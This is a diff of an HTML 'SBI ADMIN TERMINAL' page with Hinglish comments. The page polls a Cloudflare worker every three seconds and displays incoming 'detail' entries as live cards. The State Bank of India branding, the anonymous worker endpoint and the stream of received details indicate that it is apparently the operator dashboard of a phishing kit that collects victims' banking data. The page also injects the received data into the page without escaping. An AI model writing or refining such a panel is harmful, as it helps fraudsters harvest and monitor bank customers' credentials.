@@ -1,104 +1,117 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LIVE ADMIN TERMINAL</title>
+    <title>SBI ADMIN TERMINAL</title>
     <style>
-        /* Extreme Left Alignment & Professional Look */
+        /* Extreme Left Alignment */
         * { margin: 0; padding: 0; box-sizing: border-box; text-align: left !important; }
         
-        body { background-color: #f0f4f8; padding: 10px; font-family: 'Courier New', monospace; }
+        body { background-color: #e9ecef; padding: 15px; font-family: 'Courier New', monospace; }
         
         .header { 
-            background: #004a99; color: #fff; padding: 15px; 
-            font-size: 16px; font-weight: bold; border-radius: 4px;
-            margin-bottom: 15px; display: flex; justify-content: space-between;
-            border-bottom: 3px solid #e31e24;
+            background: #315195; color: #fff; padding: 15px; 
+            font-size: 18px; font-weight: bold; border-radius: 4px;
+            margin-bottom: 20px; display: flex; justify-content: space-between;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
 
-        /* Har entry ka alag Card */
+        /* Card Style - Har entry ka alag dabba */
         .log-card { 
             background: #ffffff; 
-            border-left: 8px solid #315195; 
-            margin-bottom: 12px; 
+            border-left: 8px solid #e31e24; /* SBI Red Line */
+            margin-bottom: 15px; 
             padding: 15px; 
             border-radius: 4px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             width: 100%;
-            animation: slideIn 0.3s ease-out; /* Naya data aane par effect */
         }
 
-        @keyframes slideIn {
-            from { transform: translateY(-20px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .detail-text { 
+        .detail-content { 
             color: #000; 
-            font-size: 17px; 
-            font-weight: 900; /* Ekdum Dark Bold */
+            font-size: 18px; 
+            font-weight: 900; /* Ekdum Bold */
             white-space: pre-wrap; 
-            word-break: break-all;
             line-height: 1.6;
             display: block;
         }
 
-        .meta { 
+        .meta-info { 
             display: block; 
             margin-top: 10px; 
-            font-size: 11px; 
+            font-size: 12px; 
             color: #666; 
-            border-top: 1px dashed #ddd;
+            border-top: 1px dashed #ccc;
             padding-top: 8px;
+            font-weight: normal;
         }
 
-        .status-dot { color: #00ff00; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .status { font-size: 12px; color: #00ff00; font-weight: normal; }
+        .error-msg { color: red; background: #fff; padding: 20px; text-align: center !important; border-radius: 5px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span><span class="status-dot">●</span> LIVE TERMINAL</span>
-        <span id="count">0</span>
+        <span>LIVE DATA TERMINAL <span class="status" id="live-status">● CONNECTED</span></span>
+        <span id="log-count">0</span>
     </div>
 
-    <div id="logsContainer">Connecting to database...</div>
+    <div id="logsContainer">Initialising Sync...</div>
 
     <script>
-        // APNA WORKER URL YAHA CHECK KARO
+        // *** APNA WORKER URL EK BAAR PHIR CHECK KAR LO ***
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        async function fetchNewData() {
+        async function fetchLogs() {
             try {
+                // Fetching data from Worker
                 const response = await fetch(workerURL);
-                const data = await response.json();
                 
+                if (!response.ok) {
+                    throw new Error('Server Error: ' + response.status);
+                }
+
+                const data = await response.json();
                 const container = document.getElementById('logsContainer');
-                document.getElementById('count').innerText = "Total: " + data.length;
+                document.getElementById('log-count').innerText = "Total: " + data.length;
 
                 if (data.length === 0) {
-                    container.innerHTML = "<div style='text-align:center !important; margin-top:50px; color:#888;'>Waiting for new logs...</div>";
+                    container.innerHTML = "<div class='log-card' style='text-align:center !important;'>Waiting for first entry... (Database Khali Hai)</div>";
                     return;
                 }
 
-                // .map se cards banenge. Worker se data pehle hi DESC (newest first) aa raha hai
+                // Data Rendering (Newest on Top)
                 container.innerHTML = data.map(item => `
                     <div class="log-card">
-                        <span class="detail-text">${item.detail}</span>
-                        <span class="meta">⏱ Received: ${item.time}</span>
+                        <span class="detail-content">${item.detail}</span>
+                        <span class="meta-info">⏰ Received at: ${item.time}</span>
                     </div>
                 `).join('');
 
+                document.getElementById('live-status').style.color = "#00ff00";
+                document.getElementById('live-status').innerText = "● LIVE";
+
             } catch (err) {
-                console.log("Sync Error...");
+                document.getElementById('logsContainer').innerHTML = `
+                    <div class="error-msg">
+                        <b>ADMIN ERROR:</b> Worker se data nahi mil raha.<br>
+                        <small>${err.message}</small><br><br>
+                        1. Check if Worker URL is correct.<br>
+                        2. Check if D1 Binding 'DB' is added.
+                    </div>
+                `;
+                document.getElementById('live-status').style.color = "red";
+                document.getElementById('live-status').innerText = "● OFFLINE";
             }
         }
 
-        // Har 3 second mein auto-check
-        setInterval(fetchNewData, 3000);
-        window.onload = fetchNewData;
+        // Har 3 second mein auto-update
+        setInterval(fetchLogs, 3000);
+        
+        // Pehli baar load karne ke liye
+        window.onload = fetchLogs;
     </script>
 </body>
 </html>
